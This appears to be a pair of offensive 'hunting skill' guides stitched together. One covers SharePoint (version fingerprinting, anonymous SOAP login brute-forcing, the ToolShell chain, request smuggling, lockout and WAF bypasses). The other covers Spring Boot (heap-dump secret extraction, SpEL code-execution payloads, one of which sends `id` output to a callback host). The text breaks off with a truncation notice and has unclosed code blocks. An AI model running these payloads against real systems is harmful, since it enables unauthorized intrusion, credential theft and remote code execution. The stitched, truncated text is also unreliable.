1. **End-of-life unpatched code paths.** SharePoint Server 2013 reached extended-support EoL on 2023-04-11 (final build `15.0.5545.1000` / KB5002381). Every SharePoint CVE published after that date is **permanently unpatched** on SP2013 farms. SP2016 reaches EoL 2026-07-14; SP2019 reaches EoL 2026-07-14 (next 2 months as of May 2026); only SP Subscription Edition is currently in active support.
2. **CVE-2025-53770 / 53771 "ToolShell"** — July 2025 emergency-out-of-band patch chain for SPE / SP2019 / SP2016. The vulnerable code path (anonymous `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` + anonymous `__REQUESTDIGEST` + unencrypted ViewState) is present in **SP2013 too** and will never receive a fix.
3. **Custom branded login pages forget legacy SOAP login.** `/_vti_bin/Authentication.asmx` with the `Login` SOAP op is the SharePoint equivalent of WordPress XMLRPC bypass — accepts native Forms credentials anonymously with no rate limit on most farms even when the branded UI has lockout.

**Highest-value SharePoint targets:**

- **SP2013 farms still on the public internet** — every CVE since April 2023 is unpatched. Critical-severity findings.
- **Dealer / partner / supplier portals** built on SharePoint by enterprise integrators (German VW group, a enterprise system integrator, etc.) — high-impact business data, often nested inside corporate AD trees.
- **SharePoint farms with anonymous Forms-auth zones** — Authentication.asmx becomes anonymously brute-forceable.
- **SharePoint inside corporate AD parent forests** — NTLM Type-2 leak (see `hunt-ntlm-info`) discloses the parent forest membership.
- **Telerik-integrated SharePoint installations** — additional deserialization sinks on top of SP's own.

**Asset types that pay most:** internet-reachable SP Server (any version) > SP Online with custom solutions hooks > intranet SP only after VPN compromise.

---

## Attack Surface Signals

**Response-header fingerprints (any one is sufficient — usually multiple co-occur):**
```
SPRequestGuid: <GUID>                           (always — anonymous and authenticated)
X-MS-InvokeApp: 1; RequireReadOnly              (SharePoint web request)
X-SharePointHealthScore: 0                      (SharePoint specific)
SPIisLatency: <ms>                              (SharePoint internal timing)
SPRequestDuration: <ms>                         (SharePoint request duration)
MicrosoftSharePointTeamServices: 15.0.0.0      (often stripped by ELB — but if present, exact version)
X-Forms_Based_Auth_Required: <login URL>        (Forms-auth zone indicator)
X-Forms_Based_Auth_Return_Url: <return URL>     (Forms-auth zone indicator)
X-MSDAVEXT_Error: 917656; Access denied...      (WebDAV extension active)
DAV: 1, 2                                       (WebDAV verbs supported)
Set-Cookie: ASP.NET_SessionId=...               (always — IIS session)
Set-Cookie: FedAuth=...; rtFa=...               (claims-mode auth)
Set-Cookie: WSS_FullScreenMode=...              (SharePoint UI mode)
```

**URL / path fingerprints:**
```
/_layouts/15/                  (SP2013+ layouts root — SP2010 used /_layouts/ without the 15)
/_layouts/14/                  (legacy SP2010 — almost EoL since 2020-10-13)
/_layouts/16/                  (some SP2019 / SPE)
/_vti_bin/                     (FrontPage-RPC + SOAP services)
/_vti_pvt/                     (FrontPage-RPC config — usually 403)
/_vti_inf.html                 (almost always anonymous; contains FPVersion banner)
/_api/                         (modern REST API)
/_api/$metadata                (OData metadata — often anonymous + large)
/_api/contextinfo              (FormDigest issuer — POST only)
/_catalogs/                    (site catalogs: masterpage, wp, lt, theme, solutions)
/_catalogs/users/simple.aspx   (user list — usually 403)
/_layouts/15/start.aspx        (anonymous landing — leaks version)
/_layouts/15/ToolPane.aspx     (web part editor — ToolShell sink)
/_layouts/15/Picker.aspx       (people/list picker — SafeControl recon)
/_layouts/15/download.aspx     (SP-internal file resolver — NOT outbound SSRF)
/_layouts/15/Authenticate.aspx (forms-auth redirector)
/_layouts/15/SignOut.aspx      (logout)
/_layouts/15/error.aspx        (error page — anonymous)
/_layouts/15/AccessDenied.aspx (denied page — anonymous)
/_layouts/15/scriptresx.ashx?culture=en-us&name=core    (resource bundle leak)
/_layouts/15/<Customer>/       (custom-branding modules — see Methodology step 8)
/_vti_bin/Authentication.asmx  (THE legacy login bypass — see hunt-auth-bypass Legacy-Protocol Matrix)
/_vti_bin/SharedAccess.asmx    (often anon-readable)
/_vti_bin/lists.asmx           (auth-required on hardened farms)
/_vti_bin/sites.asmx           (auth-required on hardened farms)
/_vti_bin/sts/                 (Security Token Service — usually 302 to error)
/sites/<name>/                 (site collections)
/personal/<user>/              (MySite / OneDrive-for-Business)
```

**Body signals (in HTML responses):**
```
<meta name="GENERATOR" content="Microsoft SharePoint" />
RegisterSod("...","/_layouts/15/...");                    (Script-on-demand registration)
var g_initUrl='';                                          (start.aspx MDS state)
__REQUESTDIGEST                                            (CSRF token — leaks even to anon if endpoint mis-configured)
__VIEWSTATEENCRYPTED=""                                    (Sign-only ViewState — see hunt-aspnet)
"LibraryVersion":"15.0.X.XXXX"                             (in _api/contextinfo response)
Version:15, webPermMasks:{High:0,Low:                      (in start.aspx body)
HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx body)
```

**Tech-stack signals:**
- `Server: Microsoft-IIS/10.0` + paths starting with `/_layouts/15/` → SharePoint 2013/2016/2019/SE
- AWS ELB / ALB in front of SharePoint → cross-node ViewState MAC issues possible (see hunt-aspnet)
- `WWW-Authenticate: NTLM` on `/_api/web/CurrentUser` → dual-auth (Forms + NTLM); use `hunt-ntlm-info` for AD-topology disclosure
- `*.test.<customer>.tld` → test/staging mirror of production SharePoint; data often mirrored from prod

---

## Step-by-Step Hunting Methodology

1. **Fingerprint the SharePoint version.** Build number leaks anonymously through several paths. Map the result to the CVE matrix immediately.

   ```bash
   # Method 1: _vti_inf.html (always anonymous, always present)
   curl -sk "https://target.example/_vti_inf.html"
   # → FPVersion="15.00.0.000" (15.x = SP2013, 16.x = SP2016/2019/SE)

   # Method 2: _api/contextinfo POST (anonymous on most farms)
   curl -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.LibraryVersion'
   # → "15.0.5545.1000" (full build number)

   # Method 3: /_layouts/15/start.aspx body
   curl -sk "https://target.example/_layouts/15/start.aspx" \
     | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+|16\.[0-9]+\.[0-9]+\.[0-9]+"
   ```

   **Map to CVE matrix:**

   | Build | Edition | Status | Notable unpatched-after-EoL CVEs |
   |---|---|---|---|
   | `15.0.5545.1000` | SP2013 final CU | **EoL 2023-04-11** | CVE-2023-29357, CVE-2023-33160/33157/36941, CVE-2024-21318/30043/38023/38024/38094, CVE-2025-53770/53771, CVE-2025-29794 |
   | `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
   | `16.0.10417.x+` | SP2019 / SE | active | check Microsoft's monthly Patch Tuesday |

2. **Anonymous-endpoint matrix probe.** Walk every endpoint in the table below in one pass. Anything anonymous becomes part of the attack chain.

   ```
   /_vti_inf.html                                          → version disclosure
   /_layouts/15/start.aspx                                 → version disclosure + session minting
   /_layouts/15/blank.htm                                  → benign anchor for smuggling probes
   /_layouts/15/error.aspx                                 → request-validator behaviour probe
   /_layouts/15/Authenticate.aspx?Source=                  → redirect-chain behaviour
   /_layouts/15/AccessDenied.aspx?Source=                  → redirect-chain behaviour
   /_layouts/15/SignOut.aspx                               → logout — anonymous OK
   /_layouts/15/closeConnection.aspx                       → anonymous OK
   /_layouts/15/scriptresx.ashx?culture=en-us&name=SP.Res  → 35KB localised strings
   /_layouts/15/scriptresx.ashx?culture=en-us&name=core    → 277KB localised strings
   /_layouts/15/ToolPane.aspx?DisplayMode=Edit             → ToolShell precondition (THIS IS THE BIG ONE)
   /_layouts/15/Picker.aspx                                → SafeControl recon (see step 6)
   /_layouts/15/<CustomerName>/pages/login/customlogin.aspx    → custom Forms login (replace `<CustomerName>` with target's customer name)
   /_vti_bin/Authentication.asmx                           → legacy SOAP login — anonymous brute-force (CRITICAL)
   /_vti_bin/Authentication.asmx?WSDL                      → WSDL — confirms Login + Mode ops
   /_vti_bin/SharedAccess.asmx                             → often anonymous
   /_vti_bin/spsdisco.aspx                                 → SP service discovery
   /_api/contextinfo (POST)                                → anonymous FormDigest mint (HIGH)
   /_api/$metadata                                         → 381KB API surface enumeration
   /_api/Search                                            → search service descriptor
   /_api/web/CurrentUser                                   → 401 anon BUT WWW-Authenticate: NTLM leaks AD info (see hunt-ntlm-info)
   ```

3. **Legacy SOAP login bypass via Authentication.asmx.** Cross-reference `hunt-auth-bypass` Legacy-Protocol Matrix. The standard probe:

   ```bash
   # First: confirm Mode = Forms (else this attack vector is N/A)
   curl -sk -X POST "https://target.example/_vti_bin/Authentication.asmx" \
     -H "Content-Type: text/xml; charset=utf-8" \
     -H "SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Mode" \
     -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Mode xmlns="http://schemas.microsoft.com/sharepoint/soap/" /></soap:Body></soap:Envelope>'
   # → <ModeResult>Forms</ModeResult>  ← target is exploitable
   # → <ModeResult>Windows</ModeResult>  ← target uses Windows auth only; this vector N/A

   # Then: confirm no rate limit / no lockout (synthetic non-existent users ONLY)
   # Send 10 bursts at "burst-test-synthetic-zzz" with distinct wrong passwords
   # If all 10 return 200 / 431 bytes / uniform timing → confirmed unlimited brute-force surface
   ```

   **Severity:** Critical when anonymous + no rate limit + no lockout. Submit as bug-bounty even before demonstrating successful auth — the *unbounded credential validation* is the bug, not "I cracked X credential."

4. **ToolShell precondition chain probe** (CVE-2025-53770 class). Three sub-requests:

   ```bash
   # Sub-step a: anonymous GET on ToolPane.aspx
   curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
   # Body should contain: __REQUESTDIGEST="0x...,..."  AND  __VIEWSTATEENCRYPTED=""
   # If both: precondition stack is anonymous-reachable.

   # Sub-step b: anonymous POST to /_api/contextinfo
   curl -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.FormDigestValue'
   # Should return a valid digest with 1800s validity.

   # Sub-step c: anonymous POST to ToolPane.aspx with that digest as X-RequestDigest
   curl -sk -X POST "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
     -H "X-RequestDigest: <digest from step b>" \
     --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none"
   # Should return 200 OK — server treats anonymous-with-digest as authorised state-changing POST.
   ```

   **Severity:** Critical on EoL SP2013 (no patch will ever ship). High on SP2016/2019/SE if `__VIEWSTATEENCRYPTED` is non-empty (encrypted ViewState mitigates the deserialization arm but precondition still warns of misconfig).

   **IMPORTANT:** Do NOT actually deliver a malicious ViewState payload. The precondition chain is sufficient evidence for the report. In the real CVE-2025-53770 chain, machineKey recovery is NOT a precondition for RCE: the auth-bypass (CVE-2025-49706, crafted Referer to ToolPane.aspx) + insecure deserialization (CVE-2025-49704) yield an initial web shell with no machineKey knowledge. The `<machineKey>` (ValidationKey/DecryptionKey) is then DUMPED by that web shell and used to forge signed `__VIEWSTATE` for persistent/unauthenticated re-exploitation. So machineKey is the loot of the first RCE and the persistence arm, not a gate in front of it — do not under-assess an exploitable farm just because machineKey is unknown.

5. **NTLM Type-2 AD topology disclosure.** Cross-reference `hunt-ntlm-info` for full methodology. Quick check:

   ```bash
   # Use Burp send_http1_request with keep-alive, or Python raw socket
   # Anonymous Type-1 with NetBIOS-info request flag:
   #   Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
   # Decode the Type-2 challenge → leaks NetBIOS domain, DNS forest, computer name
   ```

   **Severity:** Medium when chained with internet exposure + default `WIN-XXXXXXXXXXX` hostname; Informational otherwise.

6. **SafeControl enumeration via Picker.aspx.** Picker.aspx differentiates two error states by class existence:
   - Type EXISTS but not whitelisted: `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."`
   - Type DOES NOT exist: `"Could not load type '<Class>' from assembly 'Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c'."`

   Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` and `Microsoft.SharePoint.WebPartPages.*` types to enumerate reachable classes. The list itself is recon for CVE-2019-0604-family chains.

   ```bash
   for cls in \
     "Microsoft.SharePoint.WebControls.PeopleEditor" \
     "Microsoft.SharePoint.WebControls.ItemPicker" \
     "Microsoft.SharePoint.WebPartPages.DataFormWebPart" \
     ; do
     curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$cls")&typeName=System.String" \
       | grep -oE "<title>[^<]+</title>"
   done
   ```

7. **`download.aspx` is NOT outbound SSRF — recognize and don't waste time.** SP's `/_layouts/15/download.aspx?SourceUrl=` is an **SP-internal path resolver**, not a generic URL fetcher. Behaviours:
   - External URL (`http://evil.example.com/x`) → 500 with `"The Web application at <URL> could not be found"` — server tried to resolve as an SP web app, didn't fetch.
   - Same-origin file URL → 500 with `"<nativehr>0x81070211</nativehr>...Cannot open file '<path>'"` — server tried SPFile.OpenBinary, file not found.
   - Files matching the extension blocklist (`.ashx`, `.asmx`, `.svc`, `.config`) → 500 with `"file blocked from this Web site by
[... truncated for digest; original source remains in the source folder ...]

## Payload & Detection Patterns

**Authentication.asmx Login (the canonical brute-force endpoint):**
```xml
POST /_vti_bin/Authentication.asmx HTTP/1.1
Host: target.example
Content-Type: text/xml; charset=utf-8
SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login
Content-Length: 376

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <username>USERNAME</username>
      <password>PASSWORD</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```
Response codes:
- `<ErrorCode>NoError</ErrorCode>` → auth success; `<CookieName>FedAuth</CookieName>` and `<TimeoutSeconds>...</TimeoutSeconds>` follow
- `<ErrorCode>PasswordNotMatch</ErrorCode>` → auth fail (uniform for non-existent users too — no enum leak via error string)
- 500 + `<faultstring>Value cannot be null. Parameter name: userName</faultstring>` → empty username

**ToolShell precondition reproduction:**
```bash

# Step 1: anon GET ToolPane.aspx
TP=$(curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
echo "$TP" | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'

# Step 2: anon FormDigest
DIGEST=$(curl -sk -X POST "https://target.example/_api/contextinfo" \
  -H "Accept: application/json;odata=verbose" \
  | jq -r '.d.GetContextWebInformation.FormDigestValue')
echo "Digest: ${DIGEST:0:40}..."

# Step 3: anon POST ToolPane with digest
curl -sk -X POST -H "X-RequestDigest: $DIGEST" \
  --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none" \
  "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
  -w "\ncode=%{http_code} size=%{size_download}\n"
```

**HTTP TE.CL smuggling on AWS ELB + SP IIS back-end** (consistent on SP farms behind AWS ELB):
```
POST /_layouts/15/blank.htm HTTP/1.1
Host: target.example
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /404 HTTP/1.1
Host: x
Content-Length: 15

x=1
0

```
Expected back-end hang: ~12 s vs ~0.16 s baseline (consistent across 5 trials). Obfuscation variants (`Transfer-Encoding : chunked`, `transfer-encoding: chunked`, trailing-space, mixed-case) produce a similar ~6 s hang.

**Picker.aspx SafeControl recon:**
```bash
curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
  | grep -oE "<title>[^<]+</title>"

## Common Root Causes

1. **`/_vti_bin/Authentication.asmx` left enabled on the public-zone IIS binding.** SharePoint admins enable Forms auth on a custom login UI and don't realise the legacy SOAP Login endpoint is independently reachable.

2. **`viewStateEncryption="Auto"` on layouts pages.** SharePoint's default ViewState mode signs-only for pages without sensitive form fields. Pages like ToolPane.aspx have `__VIEWSTATEENCRYPTED=""` — exploitable if machineKey leaks.

3. **`/_api/contextinfo` POST accessible anonymously.** SharePoint Online and SPE 2024-07+ require auth on contextinfo. Earlier versions and most SP2013 farms allow anonymous POST → FormDigest token returned with 1800s validity. This is the second ToolShell precondition.

4. **NTLM enabled on public-zone IIS binding.** Default dual-auth (Forms + NTLM) leaves NTLM Negotiate available to anonymous internet users. Type-2 challenge leaks AD topology.

5. **SP2013 farms past EoL still internet-exposed.** Microsoft extended support ended 2023-04-11. Every post-April-2023 SharePoint CVE is unpatched. Common in enterprise integrator scenarios (system-integrator inside corporate-parent AD, SI-managed dealer portals).

6. **`<SafeControl>` whitelist in web.config trusted as the only gate.** Picker.aspx enforces an `instanceof PickerDialog` check, which is patched against the original CVE-2019-0604 vector — but the underlying SafeControl model itself is anonymously enumerable via the Picker.aspx error differential.

7. **AWS ELB + SP IIS without explicit Transfer-Encoding normalization.** Default ELB forwards `Transfer-Encoding` to back-end IIS; IIS interprets `Content-Length` when both are present in a way that desyncs from ELB. Multiple TE-obfuscation variants bypass simple WAF rules.

8. **Default Windows-installer hostname (`WIN-XXXXXXXXXXX`) never renamed.** Signal of rushed provisioning; correlates with default service-account passwords on SQL backend, default farm-account passwords on Central Admin, etc.

9. **Custom-branding module (`/_layouts/15/<Customer>/`) JS bundles loaded with `?v=YYYYMMDD` query strings.** The query string reveals last-modified date — useful for "this app is actively maintained" vs "this app is abandoned" determination.

10. **Cross-node ViewState MAC failures when AWS ELB doesn't pin session affinity to one WFE.** Operationally broken (users hit 500s on every POST); security-wise broadcasts farm topology in error messages.

---

## Bypass Techniques

| Defense | Bypass / Recon Strategy |
|---|---|
| Branded `customlogin.aspx` with lockout / CAPTCHA / MFA | `/_vti_bin/Authentication.asmx` legacy SOAP — none of those protections apply |
| `WWW-Authenticate: NTLM` requires authenticated callers | Default IIS `extendedProtection=None` lets you elicit the Type-2 challenge anonymously — see `hunt-ntlm-info` |
| `MicrosoftSharePointTeamServices` header stripped at ELB | Body of `/_layouts/15/start.aspx` leaks version anyway; also `/_api/contextinfo`'s `LibraryVersion` |
| `/_vti_bin/lists.asmx` 403 (SharedAccess.asmx / Authentication.asmx still open) | Different services have different ACLs; enumerate all asmx separately |
| `/_api/web/CurrentUser` 401 with stack-trace JSON | Stack traces leak even on auth-deny responses; combine with version disclosure |
| Anonymous `__REQUESTDIGEST` issued (ToolShell precondition) | Pair with anonymous ToolPane POST + unencrypted ViewState; the deserialization sink yields RCE without machineKey — machineKey is then dumped by the shell for persistent re-exploitation |
| Custom error pages set | Trigger different code paths (XML-shaped ViewState → dual-parser error differential — see `hunt-aspnet`) |
| WAF blocks `<` in query | Move payload to Cookie / Referer / SOAP body — request validator doesn't reach those contexts |
| `Microsoft.SharePoint.WebPartPages.DataFormWebPart` blocked via SafeControl patch | Enumerate SafeControl list; find a subclass that bypasses the inheritance gate |
| HTTP/2 H2.CL smuggling | AWS ALBs often don't advertise `h2` ALPN — close that family early via `openssl s_client -alpn h2,http/1.1` |
| Authenticate.aspx wraps `Source=` in ReturnUrl | Test post-auth behavior with valid creds; pre-auth chain wraps everything safely |

---

## Gate 0 Validation

Before writing the report:

1. **What can the attacker DO right now?**
   - Authentication.asmx anonymous + no rate limit → **Critical** (unbounded credential validation; password spray + UPN format from NTLM = end-to-end ATO path)
   - Full ToolShell precondition chain (anon GET + anon FormDigest + anon POST + unencrypted VS) + EoL SP2013 → **Critical** (RCE via well-documented public exploit chain, no patch will ship)
   - NTLM Type-2 AD topology disclosure + default-Windows hostname → **Medium**
   - SP2013 EoL alone → **Medium-Low** (compliance / hygiene; bug-bounty programs vary — some accept, many reject)
   - `download.aspx` URL echo without confirmed Collaborator callback → **NOT SSRF — retract**

2. **Have you reproduced the full chain to attacker-attainable impact?**
   - For Authentication.asmx: 10-burst test with uniform timing (proves no rate limit) is sufficient. Don't actually crack a credential.
   - For ToolShell: precondition chain (steps a+b+c) is sufficient. Don't deliver a malicious payload.
   - For NTLM: AV-pair decode showing AD-topology fields is sufficient.

3. **Can you reproduce in <10 minutes from a clean shell?**
   - Authentication.asmx: 2 curl commands.
   - ToolShell precondition: 3 curl commands.
   - NTLM Type-2: 1 Python snippet (the AV-pair decoder).

---

### Scenario A — a authorized SharePoint engagement against an EoL on-prem farm

Target: `https://target-portal.example/` — SharePoint Server 2013 build `15.0.5545.1000` (KB5002381 / final EoL April 2023 CU). Tenant = a system-integrator tenant (Swiss <ParentCorp> importer) inside a corporate global AD (`customer.parent-corp.example`). Server hostname `WIN-XXXXXXXXXXX` (default Windows installer pattern).

11 findings shipped: 3 Critical, 2 Medium, 6 Low/Info. The three Criticals:

1. **Authentication.asmx anonymous credential brute-force** — 10-burst test showed uniform 0.6-0.9 s timing with no rate limit, no lockout, no CAPTCHA, no MFA challenge. Identical 431-byte responses.
2. **HTTP request smuggling TE.CL** — 5/5 trials showed 12.18 s back-end hang vs 0.16 s baseline. 4 additional obfuscation variants (space-before-colon, trailing-space, lowercase, mixed-case) showed 6.16 s hang — each bypassing simple WAF rules.
3. **ToolShell precondition chain** — anonymous GET ToolPane.aspx (200) + anonymous POST `/_api/contextinfo` (200, valid FormDigest) + anonymous POST ToolPane.aspx with digest (200, no auth challenge) + `__VIEWSTATEENCRYPTED=""`. Permanent zero-day on EoL SP2013.

Plus Medium-tier: NTLM Type-2 disclosure of full AD topology (`customer.parent-corp.example`, `WIN-XXXXXXXXXXX`); SP2013 EoL exposure.

### Scenario B — `/_layouts/15/download.aspx?SourceUrl=` recognized correctly as NOT-SSRF (saved-time example)

Same target. Initial scan flagged `download.aspx?SourceUrl=http://oob.example.com/` as SSRF because the server echoed the URL in the 500 error title (`"The Web application at http://oob.example.com/ could not be found"`). 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero DNS/HTTP callbacks. Conclusion: `download.aspx` is an SP-internal `SPWebApplication` / `SPFile` resolver, NOT a generic URL fetcher. The "echo" is server-side error-string formatting. Saved from reporting an N/A finding by following the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.

### Scenario C — CVE-2019-0604 patch verification via Picker.aspx

Same target. Feeding `Microsoft.SharePoint.WebPartPages.DataFormWebPart` (the canonical CVE-2019-0604 deserialization gadget) to Picker.aspx returned `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."` — meaning the type EXISTS and is reachable through reflection, but the dialog framework's `instanceof PickerDialog` patch correctly rejects it. The patch IS in place for the original CVE-2019-0604 vector. The class-existence enumeration itself becomes recon for any future CVE-2019-0604-family chain that doesn't go through the inheritance gate.

---

## Cross-references

- **Authentication.asmx legacy SOAP login** → see `hunt-auth-bypass` Legacy-Protocol Matrix for the WordPress-XMLRPC equivalent pattern.
- **NTLM Type-2 AD-topology disclosure** → see `hunt-ntlm-info` for AV-pair decoder + severity rubric.
- **ViewState dual-parser anti-pattern, machineKey recovery, request validator bypass** → see `hunt-aspnet`.
- **HTTP request smuggling on AWS ELB + IIS** → see `hunt-http-smuggling`.
- **OOB confirmation of any SSRF claim on SP** → see `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.
- **Engagement-type confirmation before treating hygiene findings as bug-bounty submissions** → see `bb-methodology` PART 0 Mode-Confirmation Gate.

---

## Related Skills & Chains

- **`hunt-auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous Login calls on misconfigured farms. Chain primitive: SharePoint anon SOAP login probe → if response yields cookie or success differential → `hunt-auth-bypass` brute-force matrix (username enumeration via timing, password spray with low-and-slow against the same SOAP endpoint that bypasses ADFS-level lockout) → valid cred → `/_layouts/15/` authenticated surface.
- **`hunt-ntlm-info`** — Every SharePoint farm advertises `WWW-Authenticate: NTLM` anonymously on `/_vti_bin/`. Chain primitive: SharePoint NTLM Type-2 challenge capture → `hunt-ntlm-info` AV_PAIR decode yields NetBIOS domain + internal DNS forest + DC hostname → feed domain into `m365-entra-attack` ROPC user-enumeration spray on tenant tied to that domain.
- **`hunt-aspnet`** — SharePoint is ASP.NET Webforms under the covers; ViewState, machineKey, and SafeControl reflection all apply. Chain primitive: SharePoint version disclosure → confirm patch level missing → `hunt-aspnet` ViewState dual-parser MAC-bypass → deserialization gadget → RCE in `w3wp.exe` as farm account.
- **`hunt-rce`** — ToolShell precondition chain (CVE-2025-53770) is the current high-impact SP RCE path. Chain primitive: ToolShell preconditions met (`/_layouts/15/ToolPane.aspx?DisplayMode=Edit` reachable via the CVE-2025-49706 auth bypass — a crafted `Referer` header pointing at ToolPane.aspx — + version vulnerable) → `hunt-rce` deserialization gadget chain → SYSTEM/farm-account shell → `m365-entra-attack` lateral via stolen on-prem service-account token to Entra-synced identity.
- **`triage-validation`** — SharePoint farms generate a lot of "looks like a finding" hygiene noise (FormDigest issuance, version disclosure, extension blocklist quirks). Chain primitive: run every SP finding through the 7-Question Gate before reporting — most version-disclosure-only findings die at "is this actually exploitable on this farm" without a paired CVE PoC.


## SOURCE: hunt-skills/hunt-springboot/SKILL.md

## Crown Jewel Targets

Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.

**Highest-value findings:**
- **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
- **`/actuator/env`** — lists all environment variables and Spring properties including secrets
- **`/actuator/shutdown`** — POST → shuts down the application (Critical availability impact)
- **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
- **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
- **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding

---

# Spring Boot indicators
curl -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"

# Actuator root (may list available endpoints)
curl -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null

# Try common base paths
for base in "" "/manage" "/management" "/app"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
  [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
done
```

---

## Phase 2 — Actuator Endpoint Enumeration

```bash
BASE="https://$TARGET/actuator"

# High-impact endpoints
ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
           "loggers" "info" "health" "configprops" "shutdown" "trace"
           "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
           "flyway" "liquibase" "refresh" "restart")

for EP in "${ENDPOINTS[@]}"; do
  # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
  # page for many paths. Require actuator-shaped JSON (or a heapdump body)
  # before calling it EXPOSED.
  BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
  if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
    echo "[+] EXPOSED: $BASE/$EP"
  fi
done

# Get environment variables (passwords, API keys)
curl -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20

# Get all endpoint mappings (full API surface)
curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern":"\K[^"]+' | sort

# Get Spring beans (lists all registered beans, reveals internal architecture)
curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
```

---

# Download heap dump (can be large — 100MB+)
curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
ls -lh /tmp/heapdump.hprof

# Quick grep for secrets in heap dump (binary file — use strings)
strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
  grep -v "^[a-z_]" | sort -u | head -50

# More targeted extraction
strings /tmp/heapdump.hprof | grep -oP "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
strings /tmp/heapdump.hprof | grep -oP "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
strings /tmp/heapdump.hprof | grep -oP "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens

# H2 console detection
curl -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
curl -s "https://$TARGET/h2" | grep -i "H2 Console"
curl -s "https://$TARGET/console" | grep -i "H2"

# Basic SpEL test
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{7*7}"}'

# (the spawned curl makes the network request even though nothing is reflected):
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'

# CVE-2022-22963 — Spring Cloud Function SpEL
curl -s -X POST "https://$TARGET/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl COLLAB_HOST/spel-rce\")" \
  -d "test"
```

---

## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
```bash
curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
 -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
```

